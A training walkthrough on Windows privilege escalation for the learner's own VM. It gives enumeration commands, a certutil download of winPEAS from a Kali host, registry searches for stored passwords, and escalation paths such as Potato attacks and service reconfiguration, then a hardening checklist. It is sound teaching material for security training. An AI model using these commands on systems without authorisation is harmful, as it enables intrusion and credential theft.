# Walkthrough 6 — Windows Privilege Escalation (on your own VM)

The Windows companion to Walkthrough 3. You'll go from a normal Windows user to **Administrator/SYSTEM** on a **Windows VM you own**, by enumerating and abusing one misconfiguration — then harden it. Most corporate machines are Windows, so this is a core skill.

> **Target:** your own VM. Good options: a **Windows 10/Server eval VM** (free from Microsoft) you set up to be weak, the **TryHackMe "Windows PrivEsc"** room, or a HackTheBox Windows machine (legal, in-scope). Never a machine you don't own (Module 0).

## Setup
1. Run your Windows VM. Get a normal-user shell on it (RDP in, or a foothold from an earlier module).
2. From Kali, you can transfer tools over a quick HTTP server: `python3 -m http.server 8000` on Kali, then `certutil -urlcache -f http://<kali-ip>:8000/winPEASx64.exe peas.exe` on the Windows box.

## Step 1 — Know your starting position
```cmd
whoami
whoami /priv          :: your privileges — SeImpersonatePrivilege here is gold
whoami /groups
systeminfo            :: OS version and installed patches (missing = known exploits)
hostname
```
`whoami /priv` is the first thing to read. Certain privileges (**SeImpersonate**, **SeBackup**, **SeDebug**) are direct routes to SYSTEM.

## Step 2 — Enumerate (automate with WinPEAS)
```cmd
peas.exe > peas-out.txt      :: run winPEAS, read the highlighted findings
```
WinPEAS checks everything below automatically and colour-codes risks. Manually, the key checks are:

```cmd
:: Services with weak configs
sc query state= all
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

:: Unquoted service paths (a classic)
wmic service get name,pathname,displayname,startmode | findstr /i /v """

:: Stored credentials
cmdkey /list
reg query HKLM /f password /t REG_SZ /s

:: AlwaysInstallElevated (if both are 1, any .msi runs as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Step 3 — Pick a path and escalate
Common Windows privesc paths and what they mean:

- **`SeImpersonatePrivilege`** → a "Potato" attack (PrintSpoofer / GodPotato) impersonates SYSTEM. Extremely common on servers/service accounts.
- **Unquoted service path** with a writable folder in the path → drop a malicious exe that Windows runs as the service account.
- **Weak service permissions** → you can reconfigure a service's binary path (`sc config`) to run your payload, then restart it.
- **AlwaysInstallElevated = 1** → craft an `.msi` that runs as SYSTEM.
- **Stored credentials** (`cmdkey`, registry, config files, unattended install files like `Unattend.xml`) → reuse them.
- **Missing patches** (`systeminfo` → a known local-privesc CVE) → last resort.

Do one path fully, get a SYSTEM shell, confirm:
```cmd
whoami        :: nt authority\system
```
Grab the proof and screenshot every step for your notes (OSCP-PREP).

## Step 4 — The important half: harden it
Fix what you abused, as the defender:
- **Unquoted service paths** → quote them (`sc config <svc> binPath= "\"C:\Path With Spaces\svc.exe\""`).
- **Weak service permissions** → restrict who can reconfigure/start services.
- **AlwaysInstallElevated** → set both keys to 0 (never enable it).
- **SeImpersonate on service accounts** → use virtual/managed service accounts, keep them patched.
- **Stored credentials** → remove them; use a proper secret store and LAPS for local admin.
- **Missing patches** → keep Windows updated.

Re-run WinPEAS — the path you used should no longer be flagged.

## Apply to your own Windows machines
Run `whoami /priv`, check for unquoted service paths, and run WinPEAS on your *own* Windows servers/workstations. Fix what it flags before an attacker does — exactly the blue-team routine.

## Key takeaways
- `whoami /priv` + WinPEAS are your starting point; **enumerate before guessing**.
- Windows privesc is usually a service/privilege/credential misconfiguration.
- Every path doubles as a hardening item for your own machines.

Next: back to **OSCP-PREP.md** and practise on TryHackMe/HackTheBox Windows boxes.
